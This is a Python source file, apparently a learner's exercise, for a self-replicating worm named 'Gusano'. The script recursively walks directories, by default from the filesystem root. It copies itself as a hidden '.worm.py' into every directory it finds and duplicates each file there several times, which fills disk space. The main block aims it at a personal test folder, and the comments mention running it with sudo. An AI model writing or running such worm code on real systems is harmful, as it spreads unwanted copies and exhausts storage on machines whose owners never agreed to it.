import os    #this module allows python to interact with operating systems. 
import shutil #this module allows python to perform shell file operations and many more things. 

class Gusano:
    #initialization of variables, path, target_dir_list, iterations
    def __init__(self, path=None, target_dir_list=None, file_replications=None):

        #compares the type() of path to see if it has been set, it not begin at "root" in Linux
        if type(path) == type(None):
        #"/" is the name of the root directory in a linux install. The parent directory to all other directories
            self.path = "/"
            
        #else path is set to whatever the user has set.
        else:
               self.path = path

        #set target_dir_list to empty if nothing has been set by the user
        if type(target_dir_list) == type(None):
         self.target_dir_list = []

        #if not empty, set it to what it was at creation.
        else:
            self.target_dir_list = target_dir_list

        #if replications not set at creation. Default to 2.
        if type(file_replications) == type(None):
            self.file_replications = 2

        #else set replications to whatever they were at creation.
        else:
            self.file_replications = file_replications

        #Retrieve absolute path of own files
        self.own_path = os.path.realpath(__file__)

    #three args taken by this class.
    #path: this is where the worm will start to look for directories
    #target_dir_list: user can pass a list of initial target directories (Empty by default)
    #replications: defines how many times the worm will copy each existing file in each directory


    #definition calls upon beginning directory where you started. 
    def list_directories(self, path):
        self.target_dir_list.append(path)
        items_in_current_dir = os.listdir(path)
        try: 
            #item can be a directory or a file
            for item in items_in_current_dir:
                #if item, starts with '.' ignores it. These directories are hidden.
                if not item.startswith ('.'):
                #get the full path of the item
                    absolute_path = os.path.join(path, item)
                    print(absolute_path)

                    #os.path.isdir, is a function from the os library that checks to see if an item is a directory
                    if os.path.isdir(absolute_path):
                        self.list_directories(absolute_path)
                        #this is where the recursion comes in.
                        #this function calls itself to enumerate subdirectories
            
                    #pass if not a directory
                    else:
                        pass
        #I was running into permission errors when not running this in sudo. Allows it to keep going.        
        except PermissionError:
            pass 


    def create_Gusano(self):
        #iterates over target_dir_list. As we have seen, this is a giant list. 
        for directory in self.target_dir_list:
            #for each directory, appends this file name to the end and creates a file path, with a new file name at the end. 
            destination = os.path.join(directory, ".worm.py") #our file is actually called create class at the moment.
            #self.own_path, should return the path of worm file itself. Meeting the arguments for the shutil method. 
            shutil.copyfile(self.own_path, destination)
            
            
    def copy_files(self):
        #iterates over attribute target_dir_list
        for directory in self.target_dir_list:
            file_list = os.listdir(directory)
            #creates list of items, not neccessarily only files.
            for file in file_list:
                abs_path = os.path.join(directory, file)
                #joins directory, which contains absolute paths to directorys and items from file_list to create an absolute file path
                if not abs_path.startswith(".") and not os.path.isdir(abs_path):
                #checks for hidden/regular directories, .isdir, only works if entire path is there. os.path.join must be done before.
                #if abs_path is the path to an actual file, the following code will run. 
                    source = abs_path
                    for i in range(self.file_replications):
                        destination = os.path.join(directory, (file+str(i)))
                        #creates a new file path, making the file hidden and using the iterator to make it a unique name.
                        shutil.copyfile(source, destination)
                        #copyfile. Source is our original file. Destination is the file modified with our iterator counter and a "." to make it a hidden file.
                        
    def start_Gusano_actions(self):
        
        #creates a list of directories beginning with the default or user set path
        self.list_directories(self.path)
        
        #creates a copy of this file, in every directory in the target_dir_list
        self.create_Gusano()
        
        #copy the files in every directory in target_dir_list to the same directory under
        #under different names, using file_replication variable as the number of times this will occur.
        #the files should be hidden.
        self.copy_files()
        
if __name__=="__main__":
    
    #root dir is testing directory with a bunch of other directories and files I made inside of it.
    #I deleted the dot in copy files defintion for testing purposes. 
    current_directory = os.path.abspath("/home/f4u5ty/Desktop/WormTestingArena/rootdir")
    #this spawns one iteration of the worm and sets the path to rootdir 
    gusano = Gusano(path = current_directory)
    #starts this dangerous actions. Have fun! 
    gusano.start_Gusano_actions() 
    
                        
    
                        
            